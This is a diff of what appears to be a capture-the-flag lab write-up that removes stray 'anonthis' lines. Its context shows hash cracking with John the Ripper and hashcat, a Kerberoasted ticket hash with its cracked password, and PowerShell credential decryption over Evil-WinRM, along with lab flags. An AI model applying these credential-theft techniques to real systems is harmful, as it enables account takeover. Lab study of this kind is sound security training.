@@ -70,7 +70,6 @@ employee_status.xlsx  sbradley.txt
 
 The flag of the user Steven Bradley, is contained in the file sbradley.txt:
 
-anonthis
 ```
 ┌──(root@kali)-[/mnt/test]
 └─# cat sbradley.txt 
@@ -352,7 +351,6 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-anonthis
 electromagnetismo (experiment_gone_wrong.zip)
 1g 0:00:00:00 DONE (2021-07-25 15:59) 1.449g/s 12145Kp/s 12145Kc/s 12145KC/s elephantmeee..elanore67
 Use the "--show" option to display all of the cracked passwords reliably
@@ -458,7 +456,7 @@ Using some Powershell we can extract the contents of the credential file:
 
 *Evil-WinRM* PS C:\Users\lvetrova> $credential = Import-CliXml -Path 'lvetrova.xml'
 *Evil-WinRM* PS C:\Users\lvetrova> $credential.GetNetworkCredential().Password
-anonthis
+
 THM{694362e877adef0d85a92e6d17551fe4}
 ```
 
@@ -529,7 +527,6 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$6de0193a7673c6e62df419238ad76527$d395e0095763e4ce11ba6be95be475462f3d90cac67af1806dff56ed9e48a098e0d1a3a7b88b756f471b62a56353cf412aa6cae5484f01eddb53c6deceb51e52aa86f21ef6cab8396b06830e308176595f935176e761619eb94489dcc74b6f75ed6bdd4f6257c1792ae14842364b72809db19401bc3ed43c3336ff5f17e504eabd41e64ef9a6cc62ca41c3a8c929a5ca628a3dc49771dff5b13e72192ad30dc4fbfc71964b376d3d95388e29fd5248f8a22e525e9d10516b34ca520342ac5378e1922157834e7dfb6aed8e820eeb784b7bbe238b961ba921ea2d522ab606ceba1e97bba13933242e031709539eb75460bbd1964ee91ac59b0661bd3c4c22db7044cb4bc31972f6857b12fd38044e4eabbcfe8961d6bb00727a37a42e79e69157f938e625b6e03e2d8c9d919b1e40590c49727ba75612ed609812aecbbf5539c7d497d0c911cbec4f3ed4ea7798af894d5f7db7208e9040b5adbddaa365d9b070135cd99868bb967347a0d64730741d787aeb88524c9a8c85c478811e8657f3a41f03755935d8d8c2656fdc3496d502f56bf529f66f2138c383680ccb67756e408870a000e2038679f64ed87113ad6915a1f59b5a5dbb0736ff51ce4bf0c4f67bab496637fb46865011b1971e79766c245eb9d7da046299c08a78281056e078a95b6def6fbadc9810b66db5c91b879986f6388a0aa1c05594e6e127054bf98228454a3b5245e0e9e527822970682a83b4987b411d1e130e84e4eee0bcbcea61c7ccbc3e6b31bbcc34eb433d843f5d79aa05858214cc1e9aad44b6d3d409e4db4c159c6f1aad37cf3391aeea80c1d69d00f3e9a9ec46faf68ccf84f37b81da9aeb54330e0073191e36fcb6280e74ed36cab5f7e8a4edd3a0a459f5868c44b2797178cc2981c073d7107e4540a48f4aa3f99311dde23769bc377fbb2e23108217a18eb4ed84e8afd0b1bb9b11e39a5e917a62928e1d9d417a0d333b5a99b38a0f000d7a40d62aaae73fb38010f0a9f03df0dfe1913c6b494f71f90c2fde898062dcc5c68759c7bb2d1492e6543b74676d8a1c1ba8f5ab85dd0d71e4777a9f65d5ef9ec3dccc21ac1694f95de664c94961e63dd9a1f260bc35a02bb75fbf073ad8cb238959ae4ef8f6cfc0ed2806e80a8b7cd5adfeecf509b78494e9efa95c1f90a85b9799f73117607faf09f85472661a946ab3120c24d2d8e2703a545861f253cbc005741e1913dcf057437726fc61c0d7a6864a7f6ccc9d57f959529c68fcb5c230c9cf525948a2b6007795ec914688b0d6a01407159c6d887215029e0e42c4f1eb412831e1c5a35f43568a25aaa2fe189718c7bba74ac7caf953acbf8ce7d088d6bd85e6638ed1541acb95c7e5c208c4452af487e0b38c9f82d13b1fd52387dccd62e3f8b9c5188c15363ab439e567:cyanide9amine5628
-anonthis
                                                  
 Session..........: hashcat
 Status...........: Cracked
